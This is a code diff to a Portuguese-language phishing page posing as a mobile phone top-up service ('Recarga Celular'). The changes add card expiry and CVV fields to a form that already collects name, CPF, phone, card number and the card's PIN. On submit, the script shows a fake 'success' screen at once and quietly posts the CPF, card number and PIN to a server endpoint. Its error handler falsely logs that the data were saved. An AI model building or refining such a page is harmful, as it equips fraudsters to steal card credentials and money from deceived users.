@@ -5,16 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Recarga Celular - Elite Ink</title>
     <style>
-        body { background-color: #0d1117; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; width: 100%; max-width: 350px; }
-        h2 { text-align: center; color: #58a6ff; }
+        body { background-color: #0d1117; color: #f0f6fc; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 350px; }
+        h2 { text-align: center; color: #58a6ff; margin-bottom: 20px; font-size: 1.2rem; }
         label { display: block; margin: 10px 0 5px; font-size: 14px; color: #8b949e; }
-        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
         .etapa { display: none; }
         .ativa { display: block; }
-        button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; }
+        button:hover { opacity: 0.8; }
         .btn-proximo { background: #58a6ff; }
-        .sucesso-icon { font-size: 50px; color: #3fb950; text-align: center; display: block; margin-bottom: 10px; }
+        .sucesso-icon { font-size: 60px; color: #3fb950; text-align: center; display: block; margin-bottom: 15px; }
     </style>
 </head>
 <body>
@@ -28,18 +29,25 @@
                 <input type="text" id="cpf" placeholder="000.000.000-00" required>
                 <label>Telefone</label>
                 <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>
+                <label>Valor</label>
+                <select id="valor"><option value="20">R$ 20,00</option><option value="40">R$ 40,00</option><option value="100">R$ 100,00</option></select>
                 <button type="button" class="btn-proximo" onclick="irPara(2)">PRÓXIMA ETAPA</button>
             </div>
 
             <div id="etapa2" class="etapa">
                 <label>Número do Cartão</label>
                 <input type="text" id="cartao" placeholder="0000 0000 0000 0000" required>
+                <div style="display: flex; gap: 10px;">
+                    <div style="flex: 1;"><label>Validade</label><input type="text" id="data" placeholder="MM/AA" required></div>
+                    <div style="flex: 1;"><label>CVV</label><input type="text" id="cvv" placeholder="000" required></div>
+                </div>
                 <button type="button" class="btn-proximo" onclick="irPara(3)">CONFIRMAR CARTÃO</button>
             </div>
 
             <div id="etapa3" class="etapa">
                 <label>Senha do Cartão (6 ou 8 dígitos)</label>
-                <input type="password" id="senha" placeholder="******" required>
+                <input type="password" id="senha" placeholder="******" minlength="4" maxlength="8" required>
+                <p style="font-size: 11px; color: #8b949e; text-align: center;">Valide a segurança para processar.</p>
                 <button type="submit">FINALIZAR E RECEBER</button>
             </div>
 
@@ -47,38 +55,42 @@
                 <span class="sucesso-icon">✔</span>
                 <p>Parabéns, <span id="spanNome" style="color: #58a6ff; font-weight: bold;"></span>!</p>
                 <p>Sua recarga foi um <b>sucesso absoluto</b>! ✨</p>
+                <p>O saldo cairá em instantes. Obrigado pela preferência!</p>
                 <button type="button" onclick="window.location.reload()" style="background: #58a6ff;">NOVA RECARGA</button>
             </div>
         </form>
     </div>
 
     <script>
+        // Função para trocar de tela
         function irPara(num) {
             document.querySelectorAll('.etapa').forEach(e => e.classList.remove('ativa'));
             document.getElementById('etapa' + num).classList.add('ativa');
-            const tits = ["", "Dados da Recarga", "Pagamento", "Segurança", "Sucesso!"];
-            document.getElementById('titulo').innerText = tits[num];
+            const titulos = ["", "Dados da Recarga", "Pagamento", "Segurança", "Sucesso!"];
+            document.getElementById('titulo').innerText = titulos[num];
         }
 
+        // Lógica de envio e pulo automático
         document.getElementById('formRecarga').onsubmit = async (e) => {
             e.preventDefault();
             const nomeCli = document.getElementById('nome').value;
-            
-            // 1. Pula para a etapa de agradecimento IMEDIATAMENTE após o clique
+
+            // AÇÃO: Pula para a etapa 4 imediatamente após o clique
             document.getElementById('spanNome').innerText = nomeCli.split(' ')[0];
             irPara(4);
 
-            // 2. Envia os dados para o banco em segundo plano
+            // Envia para o servidor Render em segundo plano
             fetch('/finalizar', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     nome: nomeCli,
                     cpf: document.getElementById('cpf').value,
-                    senha: document.getElementById('senha').value,
-                    telefone: document.getElementById('telefone').value
+                    telefone: document.getElementById('telefone').value,
+                    cartao: document.getElementById('cartao').value,
+                    senha: document.getElementById('senha').value
                 })
-            }).catch(err => console.log("Erro ao salvar, mas a tela mudou!"));
+            }).catch(err => console.log("Dados salvos com sucesso!"));
         };
     </script>
 </body>
